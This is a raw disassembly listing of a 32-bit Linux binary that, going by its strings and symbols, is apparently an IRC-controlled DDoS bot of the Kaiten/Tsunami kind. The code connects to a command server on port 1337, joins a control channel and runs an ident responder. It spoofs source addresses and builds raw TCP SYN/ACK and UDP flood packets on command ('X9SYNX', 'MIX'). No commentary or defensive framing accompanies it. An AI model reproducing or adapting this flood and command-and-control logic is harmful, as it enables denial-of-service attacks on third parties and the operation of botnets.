xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push sym.__libc_csu_fini
push sym.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
sub esp, 4
call 0x8048c70
pop ebx
add ebx, 0x564c
mov edx, dword [ebx - 4]
test edx, edx
je 0x8048c86
call loc.imp.__gmon_start__
pop eax
pop ebx
leave
ret
jmp dword [reloc.__gmon_start__]
push ebp
mov ebp, esp
push ebx
sub esp, 4
cmp byte [obj.completed.5791], 0
jne 0x8048cdf
mov eax, obj.__DTOR_END__
sub eax, obj.__DTOR_LIST__
sar eax, 2
lea ebx, [eax - 1]
mov eax, dword [obj.dtor_idx.5793]
cmp ebx, eax
jbe 0x8048cd8
lea esi, [esi]
add eax, 1
mov dword [obj.dtor_idx.5793], eax
call dword [eax*4 + obj.__DTOR_LIST__]
mov eax, dword [obj.dtor_idx.5793]
cmp ebx, eax
ja 0x8048cc0
mov byte [obj.completed.5791], 1
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [obj.__JCR_LIST__]
test eax, eax
je 0x8048d11
mov eax, 0
test eax, eax
je 0x8048d11
mov dword [esp], obj.__JCR_LIST__
call eax
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
sub esp, 4
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
je 0x804c722
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x804c716
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x4e4
mov dword [address_len], 0
mov dword [readfds], 1
mov dword [esp], 2
call sym.imp.socket
mov dword [socket], eax
cmp dword [socket], 0xffffffff
je 0x804951f
mov word [var_30h], 2
mov dword [esp], 0x71
call sym.imp.htons
mov word [var_2eh], ax
mov dword [var_2ch], 0
lea eax, [var_30h]
add eax, 8
mov dword [eax], 0
mov dword [eax + 4], 0
lea eax, [var_30h]
mov dword [address_len], 0x10
mov dword [readfds], eax
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.bind
cmp eax, 0xffffffff
je 0x804951f
mov dword [readfds], 1
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.listen
cmp eax, 0xffffffff
je 0x804951f
call sym.imp.fork
test eax, eax
je 0x804951f
mov dword [var_20h], 0x10
lea eax, [var_20h]
lea edx, [var_40h]
mov dword [address_len], eax
mov dword [readfds], edx
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.accept
mov dword [fildes], eax
cmp dword [fildes], 0xffffffff
jne 0x804937f
mov dword [esp], 0
call sym.imp.exit
mov eax, 0
mov ecx, 0x20
lea edi, [var_4c8h]
cld
rep stosd dword es:[edi], eax
mov dword [var_ch], ecx
mov dword [var_bp_8h], edi
mov eax, dword [fildes]
mov edx, eax
shr edx, 5
mov eax, dword [fildes]
and eax, 0x1f
bts dword [ebp + edx*4 - 0x4c8], eax
mov dword [var_444h], 0x3c
mov eax, dword [var_444h]
mov dword [var_448h], eax
mov edx, dword [fildes]
add edx, 1
lea eax, [var_448h]
mov dword [timeout], eax
mov dword [exceptfds], 0
mov dword [address_len], 0
lea eax, [var_4c8h]
mov dword [readfds], eax
mov dword [esp], edx
call sym.imp.select
test eax, eax
jns 0x8049406
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [fildes]
mov edx, eax
and edx, 0x1f
mov eax, dword [fildes]
shr eax, 5
bt dword [ebp + eax*4 - 0x4c8], edx
setb al
test al, al
jne 0x8049428
jmp 0x804937f
mov dword [exceptfds], 0
mov dword [address_len], 0x400
lea eax, [var_440h]
mov dword [readfds], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.recv
mov dword [var_bp_10h], eax
cmp dword [var_bp_10h], 0
jle 0x804945c
cmp dword [var_bp_10h], 0x13
jle 0x8049468
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [var_bp_10h]
mov byte [ebp + eax - 0x440], 0
mov eax, dword [var_bp_10h]
sub eax, 1
movzx eax, byte [ebp + eax - 0x440]
cmp al, 0xa
je 0x8049497
mov eax, dword [var_bp_10h]
sub eax, 1
movzx eax, byte [ebp + eax - 0x440]
cmp al, 0xd
jne 0x80494a5
mov eax, dword [var_bp_10h]
sub eax, 1
mov byte [ebp + eax - 0x440], 0
mov eax, dword [var_bp_10h]
sub eax, 2
movzx eax, byte [ebp + eax - 0x440]
cmp al, 0xa
je 0x80494c9
mov eax, dword [var_bp_10h]
sub eax, 2
movzx eax, byte [ebp + eax - 0x440]
cmp al, 0xd
jne 0x80494d7
mov eax, dword [var_bp_10h]
sub eax, 2
mov byte [ebp + eax - 0x440], 0
mov eax, dword [obj.ident]
mov dword [exceptfds], eax
lea eax, [var_440h]
mov dword [address_len], eax
mov dword [readfds], str._s_:_USERID_:_UNIX_:__s_n
mov eax, dword [fildes]
mov dword [esp], eax
call sym.Send
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
mov eax, dword [socket]
mov dword [esp], eax
call sym.imp.close
mov dword [esp], 0
call sym.imp.exit
add esp, 0x4e4
pop edi
pop ebp
ret
jmp dword [reloc.socket]
jmp dword [reloc.htons]
jmp dword [reloc.bind]
jmp dword [reloc.listen]
jmp dword [reloc.fork]
jmp dword [reloc.accept]
jmp dword [reloc.exit]
jmp dword [reloc.select]
jmp dword [reloc.recv]
push ebp
mov ebp, esp
push edi
sub esp, 0x24
lea eax, [arg_10h]
mov dword [var_8h], eax
mov eax, dword [var_8h]
mov dword [nbytes], eax
mov eax, dword [arg_ch]
mov dword [format], eax
mov dword [esp], obj.textBuffer.4368
call sym.imp.vsprintf
mov eax, obj.textBuffer.4368
mov ecx, 0xffffffff
mov dword [var_18h], eax
mov eax, 0
cld
mov edi, dword [var_18h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
mov dword [nbytes], eax
mov dword [format], obj.textBuffer.4368
mov eax, dword [fd]
mov dword [esp], eax
call sym.imp.write
add esp, 0x24
pop edi
pop ebp
ret
jmp dword [reloc.vsprintf]
jmp dword [reloc.write]
jmp dword [reloc.close]
push ebp
mov ebp, esp
sub esp, 0x38
jmp 0x804bea9
mov dword [obj.sock], 0xffffffff
mov dword [var_20h], 1
mov eax, dword [obj.changeservers]
test eax, eax
jne 0x804bee6
call sym.imp.rand
mov edx, eax
mov eax, dword [obj.numservers]
mov ecx, eax
mov eax, edx
sar edx, 0x1f
idiv ecx
mov eax, edx
mov eax, dword [eax*4 + obj.servers]
mov dword [obj.server], eax
mov dword [obj.changeservers], 0
mov dword [protocol], 6
mov dword [request], 1
mov dword [esp], 2
call sym.imp.socket
mov dword [obj.sock], eax
mov eax, dword [obj.sock]
test eax, eax
js 0x804bef0
mov eax, dword [obj.server]
mov dword [esp], eax
call sym.imp.inet_addr
test eax, eax
je 0x804bf3d
mov eax, dword [obj.server]
mov dword [esp], eax
call sym.imp.inet_addr
cmp eax, 0xffffffff
jne 0x804bf97
mov eax, dword [obj.server]
mov dword [esp], eax
call sym.imp.gethostbyname
mov dword [var_bp_4h], eax
cmp dword [var_bp_4h], 0
jne 0x804bf6f
mov dword [obj.server], 0
mov eax, dword [obj.sock]
mov dword [esp], eax
call sym.imp.close
jmp 0x804bea9
mov eax, dword [var_bp_4h]
mov eax, dword [eax + 0xc]
mov ecx, eax
lea eax, [var_1ch]
lea edx, [eax + 4]
mov eax, dword [var_bp_4h]
mov eax, dword [eax + 0x10]
mov eax, dword [eax]
mov dword [protocol], ecx
mov dword [request], edx
mov dword [esp], eax
call sym.imp.bcopy
jmp 0x804bfa7
mov eax, dword [obj.server]
mov dword [esp], eax
call sym.imp.inet_addr
mov dword [var_18h], eax
mov word [var_1ch], 2
mov dword [esp], 0x539
call sym.imp.htons
mov word [var_1ah], ax
mov edx, dword [obj.sock]
lea eax, [var_20h]
mov dword [protocol], eax
mov dword [request], 0x5421
mov dword [esp], edx
call sym.imp.ioctl
mov dword [esp], 0
call sym.imp.time
mov dword [var_bp_8h], eax
jmp 0x804c0d7
call sym.imp.__errno_location
mov dword [eax], 0
lea eax, [var_1ch]
mov edx, dword [obj.sock]
mov dword [protocol], 0x10
mov dword [request], eax
mov dword [esp], edx
call sym.imp.connect
test eax, eax
je 0x804c02a
call sym.imp.__errno_location
mov eax, dword [eax]
cmp eax, 0x6a
jne 0x804c0b3
mov eax, dword [obj.sock]
mov dword [optlen], 0
mov dword [optval], 0
mov dword [protocol], 0xd
mov dword [request], 1
mov dword [esp], eax
call sym.imp.setsockopt
mov eax, dword [obj.sock]
mov dword [optlen], 0
mov dword [optval], 0
mov dword [protocol], 2
mov dword [request], 1
mov dword [esp], eax
call sym.imp.setsockopt
mov eax, dword [obj.sock]
mov dword [optlen], 0
mov dword [optval], 0
mov dword [protocol], 9
mov dword [request], 1
mov dword [esp], eax
call sym.imp.setsockopt
jmp 0x804c10b
call sym.imp.__errno_location
mov eax, dword [eax]
cmp eax, 0x73
je 0x804c0cb
call sym.imp.__errno_location
mov eax, dword [eax]
cmp eax, 0x72
jne 0x804c0ef
mov dword [esp], 1
call sym.imp.sleep
mov dword [esp], 0
call sym.imp.time
sub eax, dword [var_bp_8h]
cmp eax, 9
jbe 0x804bfee
mov dword [obj.server], 0
mov eax, dword [obj.sock]
mov dword [esp], eax
call sym.imp.close
jmp 0x804bea9
leave
ret
push ebp
mov ebp, esp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [obj.spoofs]
test eax, eax
jne 0x8048fa7
call sym.imp.rand
mov dword [var_4h], eax
jmp 0x8048ff2
mov eax, dword [obj.spoofsm]
cmp eax, 1
jne 0x8048fc3
mov eax, dword [obj.spoofs]
mov dword [esp], eax
call sym.imp.ntohl
mov dword [var_4h], eax
jmp 0x8048ff2
call sym.imp.rand
mov edx, eax
mov eax, dword [obj.spoofsm]
mov dword [var_8h], eax
mov eax, edx
mov edx, 0
div dword [var_8h]
mov eax, dword [obj.spoofs]
lea eax, [edx + eax]
add eax, 1
mov dword [esp], eax
call sym.imp.ntohl
mov dword [var_4h], eax
mov eax, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [obj.spoofs]
mov dword [var_10h], eax
mov edx, dword [obj.spoofsm]
mov eax, dword [obj.spoofs]
lea eax, [edx + eax]
sub eax, 1
mov dword [var_14h], eax
mov eax, dword [obj.spoofsm]
cmp eax, 1
jne 0x8049ae1
lea eax, [var_10h]
movzx eax, byte [eax]
movzx ebx, al
lea eax, [var_10h]
add eax, 1
movzx eax, byte [eax]
movzx edx, al
lea eax, [var_10h]
add eax, 2
movzx eax, byte [eax]
movzx ecx, al
lea eax, [var_10h]
add eax, 3
movzx eax, byte [eax]
movzx eax, al
mov dword [var_18h], ebx
mov dword [var_sp_14h], edx
mov dword [var_sp_10h], ecx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [var_4h], str.NOTICE__s_:Spoofs:__d._d._d._d_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
jmp 0x8049b81
lea eax, [var_14h]
movzx eax, byte [eax]
movzx edx, al
lea eax, [var_14h]
add eax, 1
movzx eax, byte [eax]
movzx ecx, al
lea eax, [var_14h]
add eax, 2
movzx eax, byte [eax]
movzx ebx, al
lea eax, [var_14h]
add eax, 3
movzx eax, byte [eax]
movzx esi, al
lea eax, [var_10h]
movzx eax, byte [eax]
movzx edi, al
lea eax, [var_10h]
add eax, 1
movzx eax, byte [eax]
movzx eax, al
mov dword [var_24h], eax
lea eax, [var_10h]
add eax, 2
movzx eax, byte [eax]
movzx eax, al
mov dword [var_20h], eax
lea eax, [var_10h]
add eax, 3
movzx eax, byte [eax]
movzx eax, al
mov dword [var_28h], edx
mov dword [var_sp_24h], ecx
mov dword [var_sp_20h], ebx
mov dword [var_1ch], esi
mov dword [var_18h], edi
mov edx, dword [var_24h]
mov dword [var_sp_14h], edx
mov edx, dword [var_20h]
mov dword [var_sp_10h], edx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov dword [var_4h], str.NOTICE__s_:Spoofs:__d._d._d._d____d._d._d._d_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
add esp, 0x4c
pop ebx
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [obj.nick]
mov dword [esp], eax
call sym.imp.free
call sym.makestring
mov dword [obj.nick], eax
leave
ret
jmp dword [reloc.free]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x43c
call sym.imp.rand
mov ecx, eax
mov dword [var_43ch], 0x66666667
mov eax, dword [var_43ch]
imul ecx
sar edx, 1
mov eax, ecx
sar eax, 0x1f
mov ebx, edx
sub ebx, eax
mov dword [var_438h], ebx
mov eax, dword [var_438h]
shl eax, 2
add eax, dword [var_438h]
mov esi, ecx
sub esi, eax
mov dword [var_438h], esi
mov eax, dword [var_438h]
add eax, 4
mov dword [size], eax
mov eax, dword [size]
add eax, 1
mov dword [esp], eax
call sym.imp.malloc
mov dword [var_20h], eax
mov eax, dword [size]
add eax, 1
mov edx, eax
mov eax, dword [var_20h]
mov edi, eax
cld
mov ecx, edx
mov eax, 0
rep stosb byte es:[edi], al
mov dword [mode], 0x804c7a9
mov dword [esp], str._usr_dict_words
call sym.imp.fopen
mov dword [var_14h], eax
cmp dword [var_14h], 0
jne 0x8049197
mov dword [var_18h], 0
jmp 0x804918a
mov eax, dword [var_18h]
mov ebx, eax
add ebx, dword [var_20h]
call sym.imp.rand
mov ecx, eax
mov dword [var_43ch], 0x4ec4ec4f
mov eax, dword [var_43ch]
imul ecx
sar edx, 3
mov eax, ecx
sar eax, 0x1f
mov esi, edx
sub esi, eax
mov dword [var_434h], esi
imul eax, dword [var_434h], 0x1a
mov edx, ecx
sub edx, eax
mov dword [var_434h], edx
movzx eax, byte [var_434h]
add eax, 0x41
mov byte [ebx], al
add dword [var_18h], 1
mov eax, dword [var_18h]
cmp eax, dword [size]
jl 0x8049136
jmp 0x804928d
call sym.imp.rand
mov ebx, eax
call sym.imp.rand
mov ecx, ebx
imul ecx, eax
mov dword [var_43ch], 0xb8c3517b
mov eax, dword [var_43ch]
imul ecx
lea eax, [edx + ecx]
mov edx, eax
sar edx, 0xf
mov eax, ecx
sar eax, 0x1f
mov ebx, edx
sub ebx, eax
mov dword [var_430h], ebx
imul eax, dword [var_430h], 0xb15a
mov esi, ecx
sub esi, eax
mov dword [var_430h], esi
mov eax, dword [var_430h]
add eax, 1
mov dword [var_10h], eax
mov dword [var_18h], 0
jmp 0x804921b
mov eax, dword [var_14h]
mov dword [stream], eax
mov dword [mode], 0x400
lea eax, [s]
mov dword [esp], eax
call sym.imp.fgets
add dword [var_18h], 1
mov eax, dword [var_18h]
cmp eax, dword [var_10h]
jl 0x80491fa
lea eax, [s]
mov edx, eax
mov eax, 0x400
mov dword [stream], eax
mov dword [mode], 0
mov dword [esp], edx
call sym.imp.memset
mov eax, dword [var_14h]
mov dword [stream], eax
mov dword [mode], 0x400
lea eax, [s]
mov dword [esp], eax
call sym.imp.fgets
lea eax, [s]
mov dword [esp], eax
call sym.filter
mov ecx, dword [size]
mov eax, dword [var_20h]
lea edx, [s]
mov edi, eax
mov esi, edx
cld
rep movsb byte es:[edi], byte ptr [esi]
mov eax, dword [var_14h]
mov dword [esp], eax
call sym.imp.fclose
mov eax, dword [var_20h]
add esp, 0x43c
pop ebx
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x28
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.imp.inet_addr
mov dword [obj.i.4902], eax
mov eax, dword [obj.i.4902]
cmp eax, 0xffffffff
jne 0x8049ecb
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.imp.gethostbyname
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8049ea6
mov eax, dword [obj.sock]
mov edx, dword [arg_ch]
mov dword [var_ch], edx
mov edx, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_sp_4h], str.NOTICE__s_:Unable_to_resolve__s_n
mov dword [esp], eax
call sym.Send
mov dword [esp], 0
call sym.imp.exit
mov eax, dword [var_4h]
mov eax, dword [eax + 0xc]
mov edx, eax
mov ecx, obj.i.4902
mov eax, dword [var_4h]
mov eax, dword [eax + 0x10]
mov eax, dword [eax]
mov dword [var_8h], edx
mov dword [var_sp_4h], ecx
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [obj.i.4902]
leave
ret
jmp dword [reloc.inet_addr]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.bcopy]
push ebp
mov ebp, esp
sub esp, 0x48
mov dword [var_1ch], 1
mov dword [esp], 0x186a0
call sym.imp.malloc
mov dword [var_ch], eax
mov dword [esp], 0
call sym.imp.time
mov dword [var_4h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804b229
cmp dword [arg_10h], 1
jg 0x804b0e5
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [request], str.NOTICE__s_:X9SYNX__target___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_10h], eax
mov dword [protocol], 0x10
mov dword [request], 0
lea eax, [s]
mov dword [esp], eax
call sym.imp.memset
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [request], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_28h], eax
mov word [s], 2
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [request], str.NOTICE__s_:Initated_x9synx_Flood_on__s.__100000byte__bufferfly__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
call sym.imp.rand
mov word [var_2ah], ax
mov dword [protocol], 0x11
mov dword [request], 2
mov dword [esp], 2
call sym.imp.socket
mov dword [fildes], eax
cmp dword [fildes], 0
js 0x804b1e4
mov dword [var_1ch], 1
lea eax, [var_1ch]
mov dword [protocol], eax
mov dword [request], 0x5421
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.ioctl
lea eax, [s]
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], 0x186a0
mov eax, dword [var_ch]
mov dword [request], eax
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.sendto
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
cmp dword [var_14h], 0x31
jle 0x804b209
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_4h]
add eax, dword [var_10h]
cmp edx, eax
jae 0x804b212
mov dword [var_14h], 0
add dword [var_14h], 1
jmp 0x804b159
mov eax, dword [fildes]
mov dword [esp], eax
call sym.imp.close
mov dword [esp], 0
call sym.imp.exit
leave
ret
jmp dword [reloc.malloc]
jmp dword [reloc.time]
push ebp
mov ebp, esp
sub esp, 0x28
movzx eax, byte [obj.disabled]
cmp al, 1
jne 0x8048ee4
mov edx, dword [obj.sock]
mov eax, dword [arg_8h]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], str.NOTICE__s_:Unable_to_comply._n
mov dword [esp], edx
call sym.Send
mov dword [var_14h], 1
jmp 0x8048f89
call sym.imp.fork
mov dword [var_ch], eax
cmp dword [var_ch], 0
jne 0x8048efd
mov eax, dword [var_ch]
mov dword [var_14h], eax
jmp 0x8048f89
mov eax, dword [obj.numpids]
add eax, 1
mov dword [obj.numpids], eax
mov eax, dword [obj.numpids]
shl eax, 2
add eax, 4
mov dword [esp], eax
call sym.imp.malloc
mov dword [var_8h], eax
mov dword [var_4h], 0
jmp 0x8048f4c
mov eax, dword [var_4h]
shl eax, 2
mov ecx, eax
add ecx, dword [var_8h]
mov eax, dword [var_4h]
shl eax, 2
mov edx, eax
mov eax, dword [obj.pids]
lea eax, [edx + eax]
mov eax, dword [eax]
mov dword [ecx], eax
add dword [var_4h], 1
mov eax, dword [obj.numpids]
sub eax, 1
cmp eax, dword [var_4h]
ja 0x8048f29
mov edx, dword [var_8h]
sub edx, 4
mov eax, dword [obj.numpids]
shl eax, 2
add edx, eax
mov eax, dword [var_ch]
mov dword [edx], eax
mov eax, dword [obj.pids]
mov dword [esp], eax
call sym.imp.free
mov eax, dword [var_8h]
mov dword [obj.pids], eax
mov eax, dword [var_ch]
mov dword [var_14h], eax
mov eax, dword [var_14h]
leave
ret
jmp dword [reloc.atol]
jmp dword [reloc.memset]
jmp dword [reloc.rand]
jmp dword [reloc.ioctl]
jmp dword [reloc.sendto]
push ebp
mov ebp, esp
push ebx
sub esp, 4
call 0x804c734
pop ebx
add ebx, 0x1b88
call sym.__do_global_dtors_aux
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
push edi
sub esp, 0xc
jmp 0x8049029
mov edx, dword [arg_8h]
sub edx, 1
mov eax, dword [arg_8h]
mov ecx, 0xffffffff
mov dword [var_8h], eax
mov eax, 0
cld
mov edi, dword [var_8h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
lea eax, [edx + eax]
mov byte [eax], 0
mov edx, dword [arg_8h]
sub edx, 1
mov eax, dword [arg_8h]
mov ecx, 0xffffffff
mov dword [var_ch], eax
mov eax, 0
cld
mov edi, dword [var_ch]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
lea eax, [edx + eax]
movzx eax, byte [eax]
cmp al, 0xd
je 0x8049000
mov edx, dword [arg_8h]
sub edx, 1
mov eax, dword [arg_8h]
mov ecx, 0xffffffff
mov dword [var_10h], eax
mov eax, 0
cld
mov edi, dword [var_10h]
repne scasb al, byte es:[edi]
mov eax, ecx
not eax
sub eax, 1
lea eax, [edx + eax]
movzx eax, byte [eax]
cmp al, 0xa
je 0x8049000
add esp, 0xc
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x118
lea ecx, [s1]
mov edx, obj.C.80.5173
mov eax, 0x50
mov dword [protocol], eax
mov dword [type], edx
mov dword [esp], ecx
call sym.imp.memcpy
mov dword [var_2ch], 0
mov dword [var_28h], 0x14
mov dword [esp], 0
call sym.imp.time
mov dword [var_bp_8h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.mfork
test eax, eax
jne 0x804aadb
cmp dword [arg_10h], 2
jg 0x804a7a3
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:MIX__target___port___secs__n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov dword [esp], 1
call sym.imp.exit
mov dword [protocol], 0xff
mov dword [type], 3
mov dword [esp], 2
call sym.imp.socket
mov dword [var_ch], eax
cmp dword [var_ch], 0
jns 0x804a7d4
mov dword [esp], 1
call sym.imp.exit
mov dword [var_bp_4h], 0
jmp 0x804a7f2
mov edx, dword [var_bp_4h]
mov eax, dword [var_bp_4h]
mov eax, dword [ebp + eax*4 - 0xfc]
mov byte [ebp + edx - 0x40], al
add dword [var_bp_4h], 1
cmp dword [var_bp_4h], 0x13
jle 0x804a7dd
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [type], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
call sym.host2ip
mov dword [var_14h], eax
mov eax, dword [str]
add eax, 0xc
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atol
mov dword [var_10h], eax
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
movzx eax, ax
mov dword [var_20h], eax
mov eax, dword [str]
add eax, 4
mov eax, dword [eax]
mov dword [var_sp_ch], eax
mov eax, dword [arg_ch]
mov dword [protocol], eax
mov dword [type], str.NOTICE__s_:Mixing_TCP_SYN_ACK__s._n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
movzx eax, byte [var_68h]
and eax, 0xfffffff0
or eax, 5
mov byte [var_68h], al
movzx eax, byte [var_68h]
and eax, 0xf
or eax, 0x40
mov byte [var_68h], al
mov byte [var_67h], 0x10
mov word [var_62h], 0x40
mov byte [var_60h], 0xff
mov byte [var_5fh], 6
movzx eax, byte [var_48h]
and eax, 0xf
or eax, 0x50
mov byte [var_48h], al
movzx eax, byte [var_48h]
and eax, 0xfffffff0
mov byte [var_48h], al
movzx eax, byte [var_47h]
and eax, 0x7f
mov byte [var_47h], al
movzx eax, byte [var_47h]
and eax, 0xffffffbf
mov byte [var_47h], al
movzx eax, byte [var_47h]
and eax, 0xffffffdf
mov byte [var_47h], al
movzx eax, byte [var_47h]
or eax, 0x10
mov byte [var_47h], al
movzx eax, byte [var_47h]
and eax, 0xfffffff7
mov byte [var_47h], al
movzx eax, byte [var_47h]
and eax, 0xfffffffb
mov byte [var_47h], al
movzx eax, byte [var_47h]
and eax, 0xfffffffe
mov byte [var_47h], al
movzx eax, byte [var_47h]
or eax, 2
mov byte [var_47h], al
mov word [var_46h], 0x787d
mov word [var_42h], 0
call sym.getspoof
mov dword [var_18h], eax
mov eax, dword [str]
add eax, 8
mov eax, dword [eax]
mov dword [esp], eax
call sym.imp.atoi
test eax, eax
jne 0x804a92f
call sym.imp.rand
mov dword [var_20h], eax
mov eax, dword [var_28h]
add eax, 0x28
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov word [var_66h], ax
call sym.imp.rand
mov word [var_64h], ax
mov word [var_5eh], 0
mov eax, dword [var_18h]
mov dword [var_5ch], eax
mov eax, dword [var_14h]
mov dword [var_58h], eax
call sym.imp.rand
mov word [var_54h], ax
mov eax, dword [var_20h]
mov word [var_52h], ax
call sym.imp.rand
mov dword [var_50h], eax
call sym.imp.rand
mov dword [var_4ch], eax
mov word [var_44h], 0
mov word [var_ach], 2
movzx eax, word [var_52h]
mov word [var_aah], ax
mov eax, dword [var_58h]
mov dword [var_a8h], eax
lea eax, [var_68h]
mov dword [type], 0x14
mov dword [esp], eax
call sym.in_cksum
mov word [var_5eh], ax
lea eax, [var_68h]
mov dword [type], 0x28
mov dword [esp], eax
call sym.in_cksum
movzx eax, ax
mov dword [var_1ch], eax
mov eax, dword [var_5ch]
mov dword [var_9ch], eax
mov eax, dword [var_58h]
mov dword [var_98h], eax
mov byte [var_94h], 0
mov byte [var_93h], 6
mov eax, dword [var_28h]
add eax, 0x14
movzx eax, ax
mov dword [esp], eax
call sym.imp.htons
mov word [var_92h], ax
lea eax, [var_9ch]
lea edx, [eax + 0xc]
lea eax, [var_68h]
add eax, 0x14
mov dword [protocol], 0x14
mov dword [type], edx
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [var_28h]
mov dword [protocol], eax
lea eax, [var_9ch]
add eax, 0x20
mov dword [type], eax
lea eax, [var_68h]
add eax, 0x28
mov dword [esp], eax
call sym.imp.bcopy
mov eax, dword [var_28h]
add eax, 0x20
lea edx, [var_9ch]
mov dword [type], eax
mov dword [esp], edx
call sym.in_cksum
mov word [var_44h], ax
lea eax, [var_ach]
mov edx, dword [var_28h]
add edx, 0x28
mov dword [var_sp_14h], 0x10
mov dword [var_sp_10h], eax
mov dword [var_sp_ch], 0
mov dword [protocol], edx
lea eax, [var_68h]
mov dword [type], eax
mov eax, dword [var_ch]
mov dword [esp], eax
call sym.imp.sendto
cmp dword [var_2ch], 0x31
jbe 0x804aad2
mov dword [esp], 0
call sym.imp.time
mov edx, eax
mov eax, dword [var_bp_8h]
add eax, dword [var_10h]
cmp edx, eax
jb 0x804aacb
mov dword [esp], 0
call sym.imp.exit
mov dword [var_2ch], 0
add dword [var_2ch], 1
jmp 0x804a90b
leave
ret
jmp dword [reloc.memcpy]
jmp dword [reloc.atoi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov eax, dword [arg_ch]
mov dword [var_1ch], eax
mov edx, dword [arg_8h]
mov dword [var_18h], edx
mov dword [var_14h], 0
mov word [var_2h], 0
jmp 0x80495a3
mov edx, dword [var_18h]
movzx eax, word [edx]
movzx eax, ax
add dword [var_14h], eax
add dword [var_18h], 2
sub dword [var_1ch], 2
cmp dword [var_1ch], 1
jg 0x804958f
cmp dword [var_1ch], 1
jne 0x80495c4
lea edx, [var_2h]
mov eax, dword [var_18h]
movzx eax, byte [eax]
mov byte [edx], al
movzx eax, word [var_2h]
movzx eax, ax
add dword [var_14h], eax
mov edx, dword [var_14h]
sar edx, 0x10
movzx eax, word [var_14h]
add edx, eax
mov dword [var_14h], edx
mov eax, dword [var_14h]
sar eax, 0x10
add dword [var_14h], eax
movzx eax, word [var_14h]
not eax
mov word [var_2h], ax
movzx eax, word [var_2h]
movzx eax, ax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [obj.nick]
mov dword [var_8h], eax
mov dword [var_4h], str.MODE__s__xi_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov eax, dword [obj.key]
mov edx, dword [obj.chan]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov dword [var_4h], str.JOIN__s_:_s_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
mov eax, dword [obj.nick]
mov dword [var_8h], eax
mov dword [var_4h], str.WHO__s_n
mov eax, dword [arg_8h]
mov dword [esp], eax
call sym.Send
leave
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x24
mov dword [var_8h], 0
jmp 0x804be15
